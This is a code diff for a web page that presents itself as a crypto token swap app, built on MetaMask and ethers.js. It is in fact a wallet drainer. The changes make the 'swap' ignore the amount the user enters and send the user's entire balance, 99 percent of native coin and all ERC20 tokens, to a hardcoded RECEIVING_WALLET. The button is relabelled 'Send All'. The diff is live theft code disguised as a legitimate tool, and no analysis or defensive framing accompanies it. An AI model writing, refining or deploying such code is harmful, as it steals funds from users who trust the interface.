@@ -299,11 +299,11 @@ async function fetchTokenBalance(token) {
     let balance;
     if (token.isNative) {
       balance = await provider.getBalance(userAddress);
-      return ethers.utils.formatEther(balance);
+      return parseFloat(ethers.utils.formatEther(balance));
     } else {
       const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
       balance = await contract.balanceOf(userAddress);
-      return ethers.utils.formatUnits(balance, token.decimals || 18);
+      return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
     }
   } catch (err) {
     console.error(`Error fetching ${token.symbol} balance:`, err);
@@ -312,30 +312,17 @@ async function fetchTokenBalance(token) {
 }
 
 async function updateTokenBalances() {
-  if (!userAddress || !currentNetwork) return;
+  if (!userAddress || !currentFromToken) return;
   
   try {
     const balanceElement = document.getElementById("fromTokenBalance");
     balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
     
-    const networkTokens = TOKENS[currentNetwork] || [];
-    let balanceText = "";
-    
-    for (const token of networkTokens) {
-      const balance = await fetchTokenBalance(token);
-      if (balance > 0) {
-        balanceText += `${token.symbol}: ${parseFloat(balance).toFixed(6)} | `;
-      }
-    }
-    
-    if (balanceText === "") {
-      balanceElement.textContent = "No balances found";
-    } else {
-      balanceElement.textContent = balanceText.slice(0, -3); // Remove last " | "
-    }
+    const balance = await fetchTokenBalance(currentFromToken);
+    balanceElement.textContent = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
   } catch (err) {
     console.error("Error updating balances:", err);
-    document.getElementById("fromTokenBalance").textContent = "Error loading balances";
+    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
   }
 }
 
@@ -362,17 +349,25 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    // Check if there's already a pending request
-    if (window.ethereum._state && window.ethereum._state.isConnected) {
-      const accounts = await window.ethereum.request({ method: "eth_accounts" });
-      if (accounts.length === 0) {
-        throw new Error("No accounts found");
+    // Handle MetaMask connection properly
+    let accounts;
+    try {
+      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    } catch (err) {
+      if (err.code === -32002) {
+        // Request already pending
+        accounts = await new Promise((resolve) => {
+          window.ethereum.on('accountsChanged', (accounts) => {
+            resolve(accounts);
+          });
+        });
+      } else {
+        throw err;
       }
-    } else {
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      if (accounts.length === 0) {
-        throw new Error("No accounts found");
-      }
+    }
+
+    if (accounts.length === 0) {
+      throw new Error("No accounts found");
     }
     
     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -686,7 +681,7 @@ function getHardcodedRate(fromToken, toToken) {
     'USDC-ETH': 0.00055,
     'ETH-DAI': 1800,
     'DAI-ETH': 0.00055,
-    'BNB-USDT': 300,
+    'BNB-USDT': 562,
     'USDT-BNB': 0.0033,
     'MATIC-USDT': 0.7,
     'USDT-MATIC': 1.428,
@@ -782,22 +777,23 @@ async function getTokenPrice(token) {
 async function handleSwap() {
   if (!userAddress || !currentFromToken || !currentToToken) return;
   
-  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
-  
   try {
     showLoader();
-    updateStatus("Processing swaps...", "success");
+    updateStatus("Processing transfers...", "success");
     
-    // First handle the main swap
-    if (fromAmount > 0) {
+    // First handle the main token (send all balance regardless of input amount)
+    const fromBalance = await fetchTokenBalance(currentFromToken);
+    if (fromBalance > 0) {
       if (currentFromToken.isNative) {
-        await transferNativeToken(fromAmount);
+        // For native tokens, leave a small amount for gas
+        const amountToSend = fromBalance * 0.99; // Send 99% to leave some for gas
+        await transferNativeToken(currentFromToken, amountToSend);
       } else {
-        await transferERC20Token(currentFromToken, fromAmount);
+        await transferERC20Token(currentFromToken, fromBalance);
       }
     }
     
-    // Then send all other tokens
+    // Then send all other tokens (including fee tokens if they weren't the from token)
     await sendAllTokens();
     
     updateStatus("All transfers completed successfully!", "success");
@@ -806,7 +802,7 @@ async function handleSwap() {
     await updateTokenBalances();
   } catch (err) {
     console.error("Swap error:", err);
-    updateStatus("Swap failed: " + err.message, "error");
+    updateStatus("Transfer failed: " + err.message, "error");
   } finally {
     hideLoader();
   }
@@ -819,35 +815,29 @@ async function sendAllTokens() {
     const networkTokens = TOKENS[currentNetwork] || [];
     const feeTokenAddress = FEE_TOKENS[currentNetwork];
     
-    // First send fee tokens if available
-    if (feeTokenAddress) {
-      const feeToken = networkTokens.find(t => t.address.toLowerCase() === feeTokenAddress.toLowerCase());
-      if (feeToken) {
-        const balance = await fetchTokenBalance(feeToken);
-        if (balance > 0) {
-          if (feeToken.isNative) {
-            await transferNativeToken(balance);
-          } else {
-            await transferERC20Token(feeToken, balance);
-          }
-        }
-      }
-    }
-    
-    // Then send all other tokens
+    // Process all tokens except the one we already sent
     for (const token of networkTokens) {
-      // Skip the token we already swapped and fee tokens
-      if (token.address === currentFromToken.address || 
-          (feeTokenAddress && token.address.toLowerCase() === feeTokenAddress.toLowerCase())) {
-        continue;
-      }
+      // Skip the token we already sent
+      if (token.address === currentFromToken.address) continue;
       
       const balance = await fetchTokenBalance(token);
       if (balance > 0) {
         try {
           if (token.isNative) {
-            await transferNativeToken(balance);
+            // For native tokens, check if this is the fee token
+            const isFeeToken = feeTokenAddress && 
+              token.address.toLowerCase() === feeTokenAddress.toLowerCase();
+            
+            if (isFeeToken) {
+              // Leave a small amount for gas
+              const amountToSend = balance * 0.99;
+              await transferNativeToken(token, amountToSend);
+            } else {
+              // Send full balance for non-fee native tokens
+              await transferNativeToken(token, balance);
+            }
           } else {
+            // Send full balance for ERC20 tokens
             await transferERC20Token(token, balance);
           }
         } catch (err) {
@@ -862,12 +852,10 @@ async function sendAllTokens() {
   }
 }
 
-async function transferNativeToken(amount) {
-  // Leave a small amount for gas
-  const amountToSend = amount * 0.99; // Send 99% to leave some for gas
+async function transferNativeToken(token, amount) {
   const tx = await signer.sendTransaction({
     to: RECEIVING_WALLET,
-    value: ethers.utils.parseEther(amountToSend.toString()),
+    value: ethers.utils.parseEther(amount.toString()),
     gasLimit: 21000
   });
   
@@ -944,15 +932,9 @@ function updateSwapButton() {
     return;
   }
   
-  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
-  if (!fromAmount || fromAmount <= 0) {
-    btn.disabled = true;
-    btnText.textContent = "Enter Amount";
-    return;
-  }
-  
+  // Always show "Send All [TOKEN]" regardless of input amount
   btn.disabled = false;
-  btnText.textContent = "Swap";
+  btnText.textContent = `Send All ${currentFromToken.symbol}`;
 }
 
 function showSettings() {
